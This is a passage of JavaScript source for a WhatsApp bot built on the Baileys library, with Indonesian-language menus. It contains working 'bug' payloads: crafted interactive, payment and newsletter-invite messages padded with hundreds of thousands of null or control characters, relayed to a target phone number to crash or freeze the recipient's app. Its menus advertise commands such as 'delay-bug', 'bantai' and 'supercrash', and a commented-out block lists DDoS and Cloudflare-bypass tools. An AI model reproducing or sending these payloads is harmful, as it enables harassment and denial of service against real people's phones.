        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await kandiXD.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			kandiXD.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363297314470847@newsletter`,
							"newsletterName": "</> CICI-UPDATE/𝕴𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖆𝖔𝖓 </>" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `Undangan Admin Channel </> 𝐀𝐧𝐝𝐫𝐚𝐳𝐲-𝐮𝐩𝐝𝐚𝐭𝐞/𝕴𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖆𝖔𝖓 </>`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await kandiXD.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await kandiXD.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await kandiXD.getName(i + '@s.whatsapp.net')}\n
FN:${await kandiXD.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: kandiXDmewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await kandiXD.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!kandiXD.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃10%",
"🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃30%",
"🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃50%",
"🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃80%",
"🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃",
"⋘ 𝑙𝑜𝑎𝑑𝑖𝑛𝑔 𝑑𝑎𝑡𝑎... ⋙",
"𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫",
]
let { key } = await kandiXD.sendMessage(from, {text: '...'})

for (let i = 0; i < baralod.length; i++) {
await kandiXD.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
kandiXD.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            kandiXD.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/ROOTCRASH.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:5.0\nN:XL;𝗣𝗮𝗻𝗻𝗢𝗳𝗳𝗰,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://img100.pixhost.to/images/963/544171424_sevsbotz.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
kandiXD.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
kandiXD.groupParticipantsUpdate(m.chat, [sender], 'delete')
kandiXD.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu': {
await loading()
let nomer = "62857979027753"
const version = require("baileys/package.json").version
const menu = `┏❐⌜ *🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃* ⌟
┃⚡ 𝐧𝐚𝐦𝐞 : 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫
┃⚡ 𝐛𝐨𝐭 : 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫
┃⚡ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏𝟏.𝟎.𝟎⚡
┃⚡ 𝐫𝐮𝐧 : *${runtime(process.uptime())}*
┃⚡ 𝐣𝐚𝐧𝐠𝐚𝐧 𝐬𝐩𝐚𝐦 𝐲𝐚 𝐊𝐨𝐧𝐭𝐨𝐥
┃⚡ 𝐌𝐞𝐠𝐚 𝐊𝐢𝐧𝐠 𝐠𝐞𝐧 𝟐
┗════════════❐

┏❐⌜ *𝐌𝐞𝐧𝐮 𝐁𝐨𝐭*⌟
┃ ➮ ᑲᥙgmᥱᥒᥙ
┃ ➮ ᥲᥣᥣmᥱᥒᥙ
┗════════════❐

*🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃*
https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D
*💐 gᥲk mᥲsᥙk ᥴһ kᥙ, ᥒ𝗍ᥲr 𝗍ᥲk ᥱᥕᥱk ᥣ᥆һ kᥲk 💐*

> ᑲ᥆𝗍 ᥒᥲmᥱ : 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 
> ᥴrᥱᥲ𝗍᥆r : 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
> ᥴᥲsᥱ ᥆rі : 𝐏𝐚𝐧𝐧 𝐎𝐟𝐟𝐜
> creator ori : 𝐊𝐚𝐧𝐝𝐢
> ᑲᥲsᥱ ᥆rі : 𝐑𝐨𝐨𝐭𝐂𝐫𝐚𝐬𝐡
> 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫 𝐯𝟏𝟎.𝟎`
kandiXD.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb },
    fileName: ucapanWaktu,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: menu,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: "https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D",
            thumbnailUrl: global.thumb,
            title: "🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃",
            body: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲",
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363297314470847@newsletter',
            serverMessageId: null,
            newsletterName: "</> 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲-𝐔𝐩𝐝𝐚𝐭𝐞/𝕴𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖆𝖔𝖓 </>"
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫`}}});

kandiXD.sendMessage(m.chat, {audio: fs.readFileSync('./AndraZyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'bugmenu': {
await loading()
const version = require("baileys/package.json").version
const bugmenu = `┏❐⌜ *🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃* ⌟
┃⚡ 𝐧𝐚𝐦𝐞 : 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫
┃⚡ 𝐛𝐨𝐭 : 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫
┃⚡ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏𝟏.𝟎.𝟎⚡
┃⚡ 𝐫𝐮𝐧 : *${runtime(process.uptime())}*
┃⚡ 𝐨𝐰𝐧𝐞𝐫 : 6289526156543
┃⚡ 𝐌𝐞𝐠𝐚 𝐊𝐢𝐧𝐠 𝐠𝐞𝐧 𝟐⚡
┗════════════❐

*🎃⃟𒆜𝐒𝐮𝐦𝐛𝐞𝐫 𝐁𝐨𝐭×⃟🎃*
https://whatsapp.com/channel/0029VaWIHsf60eBYq2m7zi3c
*💐 gᥲk mᥲsᥙk ᥴһ kᥙ, ᥒ𝗍ᥲr 𝗍ᥲk ᥱᥕᥱk ᥣ᥆һ kᥲk 💐*

┏❐⌜ *🎃⃟𒆜𝐁𝐮𝐠 𝐀𝐥𝐥 𝐃𝐞𝐯𝐢𝐜𝐞×⃟🎃* ⌟
┃➮ delay-bug *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃➮ agler-forger *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃➮ agler-system *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┗════════════❐

*𝐒𝐮𝐦𝐛𝐞𝐫 𝐒𝐜 𝐁𝐨𝐭*
https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D
*💐 gᥲk mᥲsᥙk ᥴһ kᥙ, ᥒ𝗍ᥲr 𝗍ᥲk ᥱᥕᥱk ᥣ᥆һ kᥲk 💐*

> ᑲ᥆𝗍 ᥒᥲmᥱ : 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
> ᥴrᥱᥲ𝗍᥆r : 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
> ᥴᥲsᥱ ᥆rі : 𝐏𝐚𝐧𝐧 𝐎𝐟𝐟𝐜
> creator ori : 𝐊𝐚𝐧𝐝𝐢
> ᑲᥲsᥱ ᥆rі : 𝐑𝐨𝐨𝐭𝐂𝐫𝐚𝐬𝐡
> 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫 𝐯𝟏𝟎.𝟏`
kandiXD.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb },
    fileName: ucapanWaktu,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: bugmenu,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: "https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D",
            thumbnailUrl: global.thumb,
            title: "🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃",
            body: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲",
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363297314470847@newsletter',
            serverMessageId: null,
            newsletterName: "</> 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲-𝐔𝐩𝐝𝐚𝐭𝐞/𝕴𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖆𝖔𝖓 </>"
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲`}}});

kandiXD.sendMessage(m.chat, {audio: fs.readFileSync('./AndraZyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
/*case 'ddosmenu':
await loading()
const version = require("baileys/package.json").version
m.reply(`╭──( 💧⃟𒆜𝙆𝘼𝙉𝘿𝙄𝙓𝘿⃟╳🐦‍🔥 )
║⿻ 𝐍𝐚𝐦𝐞 : ※𝐏𝐚𝐃𝐞𝐯〽️
║⿻ 𝐁𝐨𝐭 : 💧⃟𒆜𝙆𝘼𝙉𝘿𝙄𝙓𝘿⃟╳🐦‍🔥
║⿻ 𝐑𝐮𝐧 : *55 Detik*
▬▭「 ☄💧⃟𒆜𝙆𝘼𝙉𝘿𝙄𝙓𝘿⃟╳🐦‍🔥☄︎ 」▭▬
┗──────────────💧⃟𒆜𝙆𝘼𝙉𝘿𝙄𝙓𝘿⃟╳🐦‍🔥
┏─『 \`𝐃𝐃𝐎𝐒 𝐌𝐄𝐍𝐔\` 』
║⿻︎ 𝚍𝚍𝚘𝚜
║⿻︎ 𝚖𝚒𝚡
║⿻︎ 𝚏𝚕𝚘𝚘𝚍𝚜
║⿻︎ 𝚞𝚊
║⿻︎ 𝚡𝚌𝚑𝚛𝚘𝚖𝚎
║⿻︎ 𝚝𝚕𝚜
║⿻ 𝚝𝚕𝚜𝚋𝚢𝚙𝚊𝚜𝚜
║⿻ 𝚝𝚕𝚜𝚟2
║⿻ 𝚋𝚢𝚙𝚊𝚜𝚜-𝚌𝚏
║⿻ 𝚝𝚕𝚜-𝚟𝚒𝚙
║⿻ 𝚡𝚌
┗─────୨ৎ───────💧⃟𒆜𝙆𝘼𝙉𝘿𝙄𝙓𝘿⃟╳🐦‍🔥`)
break*/

case 'allmenu': {
await loading()
const version = require("baileys/package.json").version
const allmenu = `┏❐⌜ *🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃* ⌟
┃⚡ 𝐧𝐚𝐦𝐞 : 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫
┃⚡ 𝐛𝐨𝐭 : 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫
┃⚡ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏𝟏.𝟎.𝟎 ⚡
┃⚡ 𝐫𝐮𝐧 : *${runtime(process.uptime())}*
┃⚡ 𝐨𝐰𝐧𝐞𝐫 : 62857979027753
┃⚡ 𝐌𝐞𝐠𝐚 𝐊𝐢𝐧𝐠 𝐠𝐞𝐧 𝟐⚡
┗════════════❐

*🎃⃟𒆜𝐒𝐮𝐦𝐛𝐞𝐫 𝐒𝐜×⃟🎃*
https://whatsapp.com/channel/0029VaWIHsf60eBYq2m7zi3c
*💐 gᥲk mᥲsᥙk ᥴһ kᥙ, ᥒ𝗍ᥲr 𝗍ᥲk ᥱᥕᥱk ᥣ᥆һ kᥲk 💐*

┏❐⌜ *🎃⃟𒆜𝐁𝐮𝐠 𝐀𝐥𝐥 𝐃𝐞𝐯𝐢𝐜𝐞×⃟🎃* ⌟
┃➮ delay-bug *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃➮ agler-forger *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃➮ agler-system *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┗════════════❐

┏❐⌜ *🎃⃟𒆜𝐀𝐥𝐥 𝐌𝐞𝐧𝐮×⃟🎃* ⌟
┃ᥲძძ᥆ᥕᥒᥱr 
┃ᥲძძ⍴rᥱm
┃ძᥱᥣ᥆ᥕᥒᥱr
┃ძᥱᥣ⍴rᥱm 
┃⍴ᥙᑲᥣіᥴ
┃sᥱᥣ𝖿 
┃ᥱᥒᥴ <ᥴ᥆ძᥱ>
┃ᥱᥒᥴrᥡ⍴𝗍 <ᥴ᥆ძᥱ>
┃ᥲі <𝗍ᥱks>
┃s𝗍іᥴkᥱr <rᥱ⍴ᥣᥡ іmᥲgᥱ>
┃һіძᥱ𝗍ᥲg
┃𝗍ᥲgᥲᥣᥣ
┃kіᥴk 
┃⍴r᥆m᥆𝗍ᥱ  
┃ძᥱm᥆𝗍ᥱ
┗════════════❐

┏❐⌜ *🎃⃟𒆜𝐌𝐞𝐧𝐮×⃟🎃*⌟
┃ ➮ ᑲᥙgmᥱᥒᥙ
┃ ➮ ᥲᥣᥣmᥱᥒᥙ
┃ ➮ mᥱᥒᥙ
┗══════════

*𝐒𝐮𝐦𝐛𝐞𝐫 𝐁𝐨𝐭 𝐅𝐫𝐞𝐞*
https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D
*💐 gᥲk mᥲsᥙk ᥴһ kᥙ, ᥒ𝗍ᥲr 𝗍ᥲk ᥱᥕᥱk ᥣ᥆һ kᥲk 💐*

> ᑲ᥆𝗍 ᥒᥲmᥱ : 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
> ᥴrᥱᥲ𝗍᥆r : 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
> ᥴᥲsᥱ ᥆rі : 𝐏𝐚𝐧𝐧 𝐎𝐟𝐟𝐜
> creator ori : 𝐊𝐚𝐧𝐝𝐢
> ᑲᥲsᥱ ᥆rі : 𝐑𝐨𝐨𝐭𝐂𝐫𝐚𝐬𝐡
> 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫 𝐯𝟏𝟏.𝟎`
kandiXD.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb },
    fileName: ucapanWaktu,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: allmenu,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: "https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D",
            thumbnailUrl: global.thumb,
            title: "🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃",
            body: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲",
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363297314470847@newsletter',
            serverMessageId: null,
            newsletterName: "</> 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲-𝐔𝐩𝐝𝐚𝐭𝐞/𝕴𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖆𝖔𝖓 </>"
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `KiwKiwCowo`}}});

kandiXD.sendMessage(m.chat, {audio: fs.readFileSync('./AndraZyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'supercrash': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭──( 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 )
║ᨒ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗘𝗖𝗥𝗜𝗣𝗧: [𝟰.𝟬]
│ ※ 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : ${author}
║※ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│※ 𝐎𝐰𝐧 𝐍𝐨 : 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
║※ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 」▭▬
║
╰━━━━━━━━━━━━━━━━━━━ ᬼ
╰⪩｟   𝕽𝕺𝕺𝕿 𝕮𝕽𝕬𝕾𝕳  ｠⪨╯
║››halobang 62xxx
║››balas-dendam 62xxx
║››bantai 62xxx
 𝄽s  ͢u ᴘ er  ᬼ ᴠᴇʀsɪᴏɴ [ 4.0 ]
────────────── 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃`
reply(toolsmenu)
}
break

case 'multidevice': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭──( 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 )
║ᨒ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗘𝗖𝗥𝗜𝗣𝗧: [𝟯.𝟬]
│ ※ 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : ${author}
║※ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
